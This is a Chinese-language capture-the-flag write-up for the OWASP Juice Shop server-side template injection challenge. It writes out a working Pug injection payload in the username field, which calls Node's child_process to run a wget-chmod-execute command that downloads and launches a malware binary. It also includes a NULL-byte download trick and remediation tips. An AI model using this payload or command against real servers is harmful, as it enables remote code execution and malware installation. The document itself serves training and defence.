# Juice-Shop Write-up: 服务端模板注入（SSTi）

## 挑战概述
**标题：** SSTi  
**类别：** 服务端模板注入（SSTi）  
**难度：** ⭐⭐⭐⭐⭐⭐ (6/6)  

本挑战的目标是利用服务端模板注入（SSTi）漏洞，使用特制恶意软件“感染”服务器。

## 使用工具
- **Web 浏览器：** 用于浏览 Juice Shop 应用。
- **开发者工具：** 用于检查和操纵 HTML 与 JavaScript 代码。
- **命令行工具：** 用于在服务器上下载并执行恶意软件。

## 方法与解题过程

### 步骤 1：了解挑战
挑战提示提供了重要信息：
- **无需逆向工程：** 重点是利用 SSTi，无需分析恶意软件。
- **查找恶意软件：** 可通过 Google 搜索“juicy malware”找到，也可从 Juice Shop 的 FTP 隔离文件夹获取。

### 步骤 2：定位恶意软件
1. **Google 搜索：** 在 Google 上搜索“juicy malware”，可以找到以下 GitHub 仓库：
   - [Juicy Malware on GitHub](https://github.com/juice-shop/juicy-malware)
2. **FTP 隔离文件夹：** 也可以前往 `127.0.0.1:3000/#/ftp/quarantine`，并使用 NULL 字节技术下载恶意软件（在 URL 后添加 %2500.md；如有需要，请参考之前的挑战）。

### 步骤 3：准备恶意软件执行命令

由于 Juice Shop 在我的本地 Linux 机器上运行，目标是在该服务器上下载并执行恶意软件。我们希望服务器执行以下命令：

- **待执行命令：**
  ```bash
  wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware
  ```

该命令会下载恶意软件、赋予其可执行权限，然后运行它。

### 步骤 4：识别 SSTi 漏洞
检查应用的不同部分，寻找使用模板的页面，尤其是 Juice Shop 的 GitHub 页面后，发现个人资料页面使用 Pug（以前称为 Jade）模板。也可以在所有输入框中尝试基本模板注入，以找到需要利用的页面。
- **Pug JS：** 一种使用 `#{variable}` 等形式渲染动态内容的模板引擎。

<img src="../assets/difficulty6/ssti_4.png" alt="github home page" width="600px">

### 步骤 5：测试 SSTi
1. **注入简单表达式：** 在用户名输入框中输入 `#{1 + 1}`，然后点击“Set Username”。
   - **结果：** 用户名变为 `2`，证实存在 SSTi 漏洞。

<img src="../assets/difficulty6/ssti_1.png" alt="Basic example" width="600px">

2. **注入动态表达式：** 在用户名输入框中尝试更复杂的、涉及命令执行的载荷：

<img src="../assets/difficulty6/ssti_2.png" alt="whoiam command test" width="600px">

### 步骤 6：构造载荷
要执行恶意软件，我们注入一个使用 Node.js `child_process` 模块执行系统命令的载荷：
- **载荷：**
  ```pug
  #{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_amd_64?raw=true && chmod +x malware && ./malware')}
  ```

### 步骤 7：执行载荷
1. **输入载荷：** 将载荷输入用户名字段并提交。

<img src="../assets/difficulty6/ssti_3.png" alt="payload test" width="600px">

2. **验证：** 命令应在服务器上执行，下载并运行恶意软件。

## 解题说明
本挑战利用了 Pug 模板引擎中的 SSTi 漏洞。通过注入调用 Node.js `child_process` 模块执行系统命令的载荷，我们下载并运行了恶意软件，展示了该漏洞。

## 修复建议
- **输入验证与清理：** 验证并清理所有用户输入，防止注入攻击。
- **模板引擎安全：** 使用安全的模板实践，避免在模板中渲染不可信输入。
- **限制服务器权限：** 限制服务器执行系统命令和从外部来源下载文件的能力。
